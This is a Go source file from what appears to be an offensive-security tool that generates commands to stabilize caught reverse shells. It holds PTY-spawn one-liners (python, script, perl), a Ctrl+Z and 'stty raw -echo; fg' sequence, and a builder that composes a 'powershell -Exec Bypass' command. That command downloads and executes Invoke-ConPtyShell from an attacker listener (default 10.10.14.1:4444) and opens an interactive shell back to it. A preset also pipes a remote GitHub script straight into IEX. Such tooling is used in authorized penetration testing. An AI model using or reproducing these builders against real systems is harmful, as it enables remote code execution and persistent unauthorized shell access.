package core

import (
	"fmt"
	"strings"
)

// ShellStabilizeMethod identifies the PTY spawning binary/technique on the target.
type ShellStabilizeMethod string

const (
	StabilizeMethodPython3     ShellStabilizeMethod = "python3"
	StabilizeMethodPython      ShellStabilizeMethod = "python"
	StabilizeMethodScript      ShellStabilizeMethod = "script"
	StabilizeMethodPerl        ShellStabilizeMethod = "perl"
	StabilizeMethodConPtyShell ShellStabilizeMethod = "conptyshell"
)

// ShellStabilizeMode defines how the session is wired (direct raw socket vs nested nc inside SSH).
type ShellStabilizeMode string

const (
	// StabilizeModeDirect is used when DoubleAgent's terminal is directly connected to the remote socket
	// (e.g. Raw TCP listener F-31 or Serial/UART F-23). No Ctrl+Z / stty raw -echo; fg is needed.
	StabilizeModeDirect ShellStabilizeMode = "direct"

	// StabilizeModeNestedNc is used when a reverse shell is caught inside nc/rlwrap inside an SSH session.
	// It spawns the remote PTY, sends Ctrl+Z, runs stty raw -echo; fg, and syncs TERM & dimensions.
	StabilizeModeNestedNc ShellStabilizeMode = "nested_nc"

	// StabilizeModeWindowsConPty generates a ConPtyShell upgrade command for Windows targets.
	StabilizeModeWindowsConPty ShellStabilizeMode = "windows_conpty"
)

// ShellStabilizeRequest configures an F-34 shell stabilization sequence.
type ShellStabilizeRequest struct {
	SessionID string               `json:"sessionId"`
	Method    ShellStabilizeMethod `json:"method"`
	Mode      ShellStabilizeMode   `json:"mode"`
	ShellPath string               `json:"shellPath"` // e.g. /bin/bash, /bin/sh, /bin/zsh
	Term      string               `json:"term"`      // e.g. xterm-256color
	Cols      uint16               `json:"cols"`
	Rows      uint16               `json:"rows"`
	LHost     string               `json:"lhost,omitempty"`
	LPort     int                  `json:"lport,omitempty"`
}

// ShellStabilizePreset describes a pre-configured F-34 stabilization method for the UI.
type ShellStabilizePreset struct {
	ID          ShellStabilizeMethod `json:"id"`
	Name        string               `json:"name"`
	OS          string               `json:"os"`
	Description string               `json:"description"`
	Command     string               `json:"command"`
}

// ShellStabilizeStep represents one timed write step in a stabilization sequence.
type ShellStabilizeStep struct {
	Data    string
	DelayMs int
}

// DefaultShellStabilizePresets returns built-in F-34 stabilization presets.
func DefaultShellStabilizePresets() []ShellStabilizePreset {
	return []ShellStabilizePreset{
		{
			ID:          StabilizeMethodPython3,
			Name:        "Python 3 PTY Spawn (Recommended)",
			OS:          "Linux / Unix",
			Description: "Spawns an interactive PTY via python3 pty module, sets TERM=xterm-256color and syncs terminal rows/cols.",
			Command:     `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
		},
		{
			ID:          StabilizeMethodPython,
			Name:        "Python 2 PTY Spawn",
			OS:          "Linux / Unix",
			Description: "Legacy Python 2 fallback for older targets without python3.",
			Command:     `python -c 'import pty; pty.spawn("/bin/bash")'`,
		},
		{
			ID:          StabilizeMethodScript,
			Name:        "script -qc PTY Spawn",
			OS:          "Linux / Unix",
			Description: "Uses util-linux script utility to allocate a PTY when Python is unavailable.",
			Command:     `script -qc /bin/bash /dev/null`,
		},
		{
			ID:          StabilizeMethodPerl,
			Name:        "Perl Interactive Shell",
			OS:          "Linux / Unix",
			Description: "Executes interactive shell via Perl when Python and script are missing.",
			Command:     `perl -e 'exec "/bin/bash";'`,
		},
		{
			ID:          StabilizeMethodConPtyShell,
			Name:        "Windows ConPtyShell Upgrade",
			OS:          "Windows",
			Description: "Upgrades a Windows PowerShell/cmd reverse shell to a full interactive ConPTY terminal.",
			Command:     `IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{LHOST}} {{LPORT}} -Rows {{ROWS}} -Cols {{COLS}}`,
		},
	}
}

// sanitizeShellValue strips whitespace, quotes, and shell metacharacters.
func sanitizeShellValue(val, fallback string) string {
	val = strings.TrimSpace(val)
	if val == "" {
		return fallback
	}
	val = strings.Map(func(r rune) rune {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
			r == '/' || r == '-' || r == '_' || r == '.' || r == ':' {
			return r
		}
		return -1
	}, val)
	if val == "" {
		return fallback
	}
	return val
}

// BuildShellStabilizeSteps generates the ordered terminal write steps for F-34 stabilization.
func BuildShellStabilizeSteps(req ShellStabilizeRequest) ([]ShellStabilizeStep, error) {
	if strings.TrimSpace(req.SessionID) == "" {
		return nil, fmt.Errorf("sessionId is required")
	}

	shell := sanitizeShellValue(req.ShellPath, "/bin/bash")
	term := sanitizeShellValue(req.Term, "xterm-256color")
	cols := req.Cols
	if cols == 0 {
		cols = 120
	}
	rows := req.Rows
	if rows == 0 {
		rows = 32
	}

	if req.Mode == StabilizeModeWindowsConPty || req.Method == StabilizeMethodConPtyShell {
		lhost := sanitizeShellValue(req.LHost, "10.10.14.1")
		lport := req.LPort
		if lport <= 0 || lport > 65535 {
			lport = 4444
		}
		cmd := fmt.Sprintf(
			"powershell -NoP -NonI -Exec Bypass -Command \"IEX(IWR http://%s:%d/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell %s %d -Rows %d -Cols %d\"\n",
			lhost, lport, lhost, lport, rows, cols,
		)
		return []ShellStabilizeStep{
			{Data: cmd, DelayMs: 0},
		}, nil
	}

	var spawnCmd string
	switch req.Method {
	case StabilizeMethodPython:
		spawnCmd = fmt.Sprintf("python -c 'import pty; pty.spawn(\"%s\")'\n", shell)
	case StabilizeMethodScript:
		spawnCmd = fmt.Sprintf("script -qc %s /dev/null\n", shell)
	case StabilizeMethodPerl:
		spawnCmd = fmt.Sprintf("perl -e 'exec \"%s\";'\n", shell)
	case StabilizeMethodPython3, "":
		spawnCmd = fmt.Sprintf("python3 -c 'import pty; pty.spawn(\"%s\")'\n", shell)
	default:
		return nil, fmt.Errorf("unsupported shell stabilization method: %s", req.Method)
	}

	envResizeCmd := fmt.Sprintf("export TERM=%s SHELL=%s; stty rows %d cols %d\n", term, shell, rows, cols)

	if req.Mode == StabilizeModeNestedNc {
		return []ShellStabilizeStep{
			{Data: spawnCmd, DelayMs: 0},
			// Ctrl+Z (0x1a) to background netcat in the outer SSH shell
			{Data: "\x1a", DelayMs: 450},
			// Set local outer PTY to raw -echo and bring nc back to foreground
			{Data: "stty raw -echo; fg\n", DelayMs: 350},
			// Press Enter to get prompt back
			{Data: "\n", DelayMs: 250},
			// Sync TERM and dimensions on the remote PTY
			{Data: envResizeCmd, DelayMs: 250},
		}, nil
	}

	// Default: StabilizeModeDirect (DoubleAgent owns the raw socket/PTY directly)
	return []ShellStabilizeStep{
		{Data: spawnCmd, DelayMs: 0},
		{Data: envResizeCmd, DelayMs: 450},
	}, nil
}
